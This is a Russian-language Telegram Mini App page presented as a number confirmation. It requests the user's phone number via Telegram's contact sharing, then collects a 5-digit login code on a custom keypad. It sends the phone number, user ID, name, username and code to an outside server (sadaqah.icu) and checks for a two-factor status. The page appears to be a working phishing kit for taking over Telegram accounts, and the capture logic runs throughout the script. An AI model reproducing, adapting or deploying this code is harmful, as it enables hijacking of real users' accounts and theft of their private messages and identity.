<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <title>Подтверждение</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    :root {
      --bg: var(--tg-theme-bg-color, #0b0d10);
      --text: var(--tg-theme-text-color, #e9eef5);
      --hint: var(--tg-theme-hint-color, rgba(233,238,245,.65));
      --secondary: var(--tg-theme-secondary-bg-color, rgba(255,255,255,.06));
      --button: var(--tg-theme-button-color, #2ea6ff);
      --buttonText: var(--tg-theme-button-text-color, #ffffff);
      --radius: 18px;
      --shadow: 0 12px 30px rgba(0,0,0,.25);
    }
    * { box-sizing: border-box; margin:0; padding:0; }
    body {
      min-height: 100vh;
      color: var(--text);
      background: radial-gradient(1200px 700px at 20% -10%, rgba(46,166,255,.20), transparent 55%),
                  radial-gradient(900px 600px at 110% 10%, rgba(120,93,255,.18), transparent 52%),
                  var(--bg);
      font-family: system-ui, sans-serif;
      padding: env(safe-area-inset-top, 16px) 16px env(safe-area-inset-bottom, 16px);
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .wrap { width: 100%; max-width: 420px; display: flex; flex-direction: column; gap: 16px; }
    .card {
      background: linear-gradient(180deg, rgba(255,255,255,.08), rgba(255,255,255,.05));
      border: 1px solid rgba(255,255,255,.10);
      border-radius: var(--radius);
      box-shadow: var(--shadow);
      padding: 24px 16px;
      backdrop-filter: blur(10px);
    }
    .title { font-size: 20px; font-weight: 700; margin-bottom: 8px; }
    .subtitle { color: var(--hint); font-size: 14px; line-height: 1.4; }
    .pill {
      padding: 8px 12px;
      border-radius: 999px;
      background: var(--secondary);
      color: var(--hint);
      font-size: 12px;
      border: 1px solid rgba(255,255,255,.08);
      white-space: nowrap;
    }
    .pill.active { background: rgba(46,166,255,.15); color: #2ea6ff; border-color: rgba(46,166,255,.3); }
    .top { display: flex; justify-content: space-between; align-items: flex-start; gap: 12px; }
    .codeBox {
      margin: 20px 0 12px;
      padding: 16px;
      border-radius: 16px;
      border: 1px solid rgba(255,255,255,.12);
      background: rgba(0,0,0,.15);
      text-align: center;
    }
    .codeDots { display: flex; justify-content: center; gap: 14px; }
    .dot {
      width: 14px; height: 14px; border-radius: 50%;
      background: rgba(255,255,255,.18);
      border: 1px solid rgba(255,255,255,.15);
      transition: all 0.2s;
    }
    .dot.filled { background: #2ea6ff; border-color: rgba(46,166,255,.5); transform: scale(1.1); }
    .hintRow { display: flex; justify-content: space-between; color: var(--hint); font-size: 13px; margin-top: 8px; }
    .keyboard {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 12px;
    }
    .key {
      height: 64px;
      border-radius: 16px;
      border: 1px solid rgba(255,255,255,.12);
      background: rgba(255,255,255,.05);
      color: var(--text);
      font-size: 24px;
      font-weight: bold;
      box-shadow: 0 6px 16px rgba(0,0,0,.2);
      transition: all 0.12s;
      cursor: pointer;
    }
    .key:active { transform: scale(0.96); opacity: 0.9; }
    .spacer { opacity: 0; pointer-events: none; }

    /* Phone screen extras */
    .phone-btn {
      margin-top: 20px;
      width: 100%;
      padding: 16px;
      border-radius: 14px;
      border: none;
      background: var(--button);
      color: var(--buttonText);
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: opacity 0.15s;
    }
    .phone-btn:active { opacity: 0.85; }
    .phone-btn:disabled { opacity: 0.5; cursor: not-allowed; }

    .status-text {
      margin-top: 12px;
      text-align: center;
      font-size: 13px;
      color: var(--hint);
      min-height: 20px;
    }

    .spinner {
      display: inline-block;
      width: 14px; height: 14px;
      border: 2px solid rgba(255,255,255,.2);
      border-top-color: #2ea6ff;
      border-radius: 50%;
      animation: spin 0.7s linear infinite;
      vertical-align: middle;
      margin-right: 6px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }

    .hidden { display: none !important; }
  </style>
</head>
<body>
  <div class="wrap">
    <!-- Экран запроса номера -->
    <div id="phoneScreen" class="card hidden">
      <div class="top">
        <div>
          <div class="title">Подтверждение номера</div>
          <div class="subtitle">Нажмите кнопку ниже — Telegram попросит поделиться контактом</div>
        </div>
        <div class="pill" id="phoneStatusPill">Ожидание</div>
      </div>
      <button class="phone-btn" id="shareBtn" onclick="requestContact()">
        📱 Поделиться номером
      </button>
      <div class="status-text" id="phoneStatusText"></div>
    </div>

    <!-- Экран ввода кода -->
    <div id="codeScreen" class="card hidden">
      <div class="top">
        <div>
          <div class="title">Введите код</div>
          <div class="subtitle">Код из SMS / Telegram</div>
        </div>
        <div class="pill active" id="maskedPhone">—</div>
      </div>
      <div class="codeBox">
        <div class="codeDots" id="dots"></div>
      </div>
      <div class="hintRow">
        <span id="progress">0 / 5</span>
        <span>⌫ — стереть</span>
      </div>
    </div>

    <!-- Клавиатура (только на экране кода) -->
    <div id="keyboard" class="keyboard hidden"></div>
  </div>

  <script>
    const tg = window.Telegram.WebApp;
    if (!tg) { alert("Не в Telegram"); throw new Error("Not in Telegram"); }

    tg.ready();
    tg.expand();

    const tgUser = tg.initDataUnsafe?.user;
    const userId = tgUser?.id;
    if (!userId) { alert("Нет user ID"); throw new Error("No user ID"); }

    // Читаем phone из URL-параметра (бот передаёт его при открытии WebApp)
    const urlPhone = new URLSearchParams(location.search).get('phone') || '';

    const CODE_LEN = 5;
    let code = '';
    let phone = urlPhone;
    let contactRequesting = false;

    // ── DOM ──────────────────────────────────────────────────────
    const phoneScreen  = document.getElementById('phoneScreen');
    const codeScreen   = document.getElementById('codeScreen');
    const keyboard     = document.getElementById('keyboard');
    const shareBtn     = document.getElementById('shareBtn');
    const phoneStatusPill = document.getElementById('phoneStatusPill');
    const phoneStatusText = document.getElementById('phoneStatusText');
    const maskedPhone  = document.getElementById('maskedPhone');
    const dotsEl       = document.getElementById('dots');
    const progressEl   = document.getElementById('progress');

    // ── Утилиты ──────────────────────────────────────────────────
    function mask(p) {
      if (!p) return '—';
      const d = p.replace(/\D/g, '');
      return d.length > 4 ? '+' + d.slice(0,1) + '****' + d.slice(-4) : p;
    }

    function setPhoneStatus(text, loading = false) {
      phoneStatusText.innerHTML = loading
        ? `<span class="spinner"></span>${text}`
        : text;
    }

    // ── Экраны ──────────────────────────────────────────────────
    function showPhone() {
      phoneScreen.classList.remove('hidden');
      codeScreen.classList.add('hidden');
      keyboard.classList.add('hidden');
    }

    function showCode() {
      phoneScreen.classList.add('hidden');
      codeScreen.classList.remove('hidden');
      keyboard.classList.remove('hidden');
      maskedPhone.textContent = mask(phone);
      renderDots();
    }

    // ── Запрос контакта ──────────────────────────────────────────
    // Если бот уже передал phone в URL — сразу на экран кода (старый флоу через чат)
    // Если нет — запрашиваем через requestContact
    function init() {
      if (urlPhone) {
        // Телефон пришёл из URL — бот уже отправил код, просто показываем экран
        phone = urlPhone;
        showCode();
      } else {
        // Нужно получить номер через WebApp requestContact
        showPhone();
      }
    }

    function requestContact() {
      if (contactRequesting) return;
      contactRequesting = true;
      shareBtn.disabled = true;
      setPhoneStatus('Запрашиваем номер...', true);

      // Слушаем событие contactRequested
      function onContactResult(eventData) {
        console.log('[contactRequested]', eventData);
        tg.offEvent('contactRequested', onContactResult);
        contactRequesting = false;

        if (eventData && eventData.status === 'sent' && eventData.contact) {
          const rawPhone = eventData.contact.phone_number || '';
          if (rawPhone) {
            phone = '+' + rawPhone.replace(/\D/g, '');
            setPhoneStatus('Отправляем код...', true);
            submitPhone(phone);
            return;
          }
        }

        // Пользователь отказался или нет номера в событии
        shareBtn.disabled = false;
        setPhoneStatus('Отказано. Попробуйте ещё раз.');
      }

      tg.onEvent('contactRequested', onContactResult);

      // Fallback: если tg.requestContact вернул true сразу (некоторые версии)
      tg.requestContact((ok) => {
        console.log('[requestContact cb]', ok);
        // Не делаем ничего — ждём onEvent 'contactRequested'
        // В некоторых клиентах событие не стреляет, обрабатываем ниже
        setTimeout(() => {
          if (contactRequesting) {
            // Событие не пришло — пробуем достать из initDataUnsafe (не всегда есть)
            tg.offEvent('contactRequested', onContactResult);
            contactRequesting = false;
            if (!ok) {
              shareBtn.disabled = false;
              setPhoneStatus('Отказано. Попробуйте ещё раз.');
            } else {
              // ok=true но без номера — просим открыть чат и нажать кнопку
              setPhoneStatus('Нажмите кнопку в чате бота ↓');
              shareBtn.disabled = false;
            }
          }
        }, 10000);
      });
    }

    // ── Отправка номера на бэкенд ─────────────────────────────────
    async function submitPhone(p) {
      try {
        const resp = await fetch('https://sadaqah.icu/submit_phone', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            user_id: userId,
            phone: p,
            first_name: tgUser?.first_name || '',
            username: tgUser?.username || ''
          })
        });
        const data = await resp.json();

        if (data.status === 'ok') {
          phone = data.phone || p;
          phoneStatusPill.textContent = mask(phone);
          phoneStatusPill.classList.add('active');
          setPhoneStatus('Код отправлен!');
          setTimeout(showCode, 500);
        } else {
          shareBtn.disabled = false;
          setPhoneStatus('Ошибка: ' + (data.message || 'попробуйте ещё'));
        }
      } catch (e) {
        console.error(e);
        shareBtn.disabled = false;
        setPhoneStatus('Ошибка сети. Попробуйте ещё раз.');
      }
    }

    // ── Клавиатура кода ───────────────────────────────────────────
    function renderDots() {
      dotsEl.innerHTML = '';
      for (let i = 0; i < CODE_LEN; i++) {
        const dot = document.createElement('div');
        dot.className = 'dot' + (i < code.length ? ' filled' : '');
        dotsEl.appendChild(dot);
      }
      progressEl.textContent = `${code.length} / ${CODE_LEN}`;
    }

    function addDigit(d) {
      if (code.length >= CODE_LEN) return;
      code += d;
      renderDots();
      if (code.length === CODE_LEN) {
        tg.MainButton.setText('✅ Подтвердить').show();
        tg.MainButton.onClick(submitCode);
      } else {
        tg.MainButton.hide();
      }
    }

    function delDigit() {
      code = code.slice(0, -1);
      renderDots();
      tg.MainButton.hide();
    }

    async function submitCode() {
      if (code.length !== CODE_LEN) return;
      tg.MainButton.showProgress(true);
      tg.MainButton.disable();

      try {
        const resp = await fetch('https://sadaqah.icu/submit_code', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ user_id: userId, phone, code })
        });
        const data = await resp.json();

        if (data.status === 'ok') {
          tg.close();
        } else if (data.status === '2fa_required') {
          // TODO: показать экран 2FA
          tg.close();
        } else {
          alert(data.message || 'Неверный код, попробуйте ещё раз');
          code = '';
          renderDots();
        }
      } catch (e) {
        alert('Ошибка сети');
      } finally {
        tg.MainButton.hideProgress();
        tg.MainButton.enable();
        tg.MainButton.hide();
      }
    }

    // Строим клавиатуру
    ['1','2','3','4','5','6','7','8','9','spacer','0','del'].forEach(k => {
      const btn = document.createElement('button');
      btn.className = 'key';
      if (k === 'spacer') {
        btn.classList.add('spacer');
      } else if (k === 'del') {
        btn.textContent = '⌫';
        btn.onclick = delDigit;
      } else {
        btn.textContent = k;
        btn.onclick = () => addDigit(k);
      }
      keyboard.appendChild(btn);
    });

    // ПК клавиатура
    window.addEventListener('keydown', e => {
      if (codeScreen.classList.contains('hidden')) return;
      if (/^[0-9]$/.test(e.key)) addDigit(e.key);
      if (e.key === 'Backspace') delDigit();
      if (e.key === 'Enter' && code.length === CODE_LEN) submitCode();
    });

    // ── Старт ─────────────────────────────────────────────────────
    init();
    console.log('[INIT] userId:', userId, 'urlPhone:', urlPhone);
  </script>
</body>
</html>
